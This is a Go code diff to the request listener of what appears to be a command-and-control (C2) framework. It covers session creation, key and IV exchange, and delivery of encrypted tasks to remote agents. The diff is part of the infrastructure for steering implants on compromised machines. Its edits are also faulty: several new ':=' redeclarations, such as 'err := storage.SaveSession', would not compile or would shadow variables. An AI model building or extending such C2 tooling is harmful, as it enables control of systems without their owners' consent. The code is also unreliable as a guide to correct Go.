@@ -1,10 +1,12 @@
 package listeners
 
 import (
-	commstypes "kingdom/internal/comms/comms_types"
-	comms "kingdom/internal/comms"
-	storage "kingdom/internal/storage"
+	"bytes"
+	"io"
 	scheduler "kingdom/internal/c2"
+	comms "kingdom/internal/comms"
+	commstypes "kingdom/internal/comms/comms_types"
+	storage "kingdom/internal/storage"
 )
 
 func HandleRequest(clientID string, agentID string, body io.ReadCloser) ([]byte, error) {
@@ -15,7 +17,7 @@ func HandleRequest(clientID string, agentID string, body io.ReadCloser) ([]byte,
 		return nil, err
 	}
 
-	sess, found = storage.GetSession(clientID, agentID)
+	sess, found := storage.GetSession(clientID, agentID)
 	if !found {
 		temp_key, temp_iv, err := comms.GenerateTempKeyAndIV(clientID, agentID)
 		if err != nil {
@@ -32,33 +34,36 @@ func HandleRequest(clientID string, agentID string, body io.ReadCloser) ([]byte,
 			return nil, err
 		}
 
-		key, err = comms.GenerateKey()
+		key, err := comms.GenerateKey()
 		if err != nil {
 			return nil, err
 		}
-		iv, err = comms.GenerateIV()
+		iv, err := comms.GenerateIV()
 		if err != nil {
 			return nil, err
 		}
 
-		sess = storage.NewSession(clientID, agentID, key, iv)
-		err = storage.SaveSession(sess)
+		sess := storage.NewSession(clientID, agentID, key, iv)
+		err := storage.SaveSession(sess)
 		if err != nil {
 			return nil, err
 		}
 		init := &commstypes.Task{
-			ID:    "session_init",
+			ID:      "session_init",
 			Command: "init",
-			Args:  []string{key, iv},
+			Args: string(bytes.Join([][]byte{
+				[]byte(key),
+				[]byte(iv),
+			}, []byte(","))),
 		}
-		resp, err := comms.Encode(init, temp_key, temp_iv)
+		resp, _, _, err := comms.Encode(init, temp_key, temp_iv)
 		if err != nil {
 			return nil, err
 		}
 		return resp, nil
-	}else {
-		key = sess.Key
-		iv = sess.IV
+	} else {
+		key := sess.Key
+		iv := sess.IV
 
 		req, err := comms.Decode[commstypes.TaskResult](rawData, key, iv)
 		if err != nil {
@@ -70,7 +75,7 @@ func HandleRequest(clientID string, agentID string, body io.ReadCloser) ([]byte,
 			return nil, err
 		}
 
-		resp, err := comms.Encode(task, key, iv)
+		resp, _, _, err := comms.Encode(task, key, iv)
 		if err != nil {
 			return nil, err
 		}
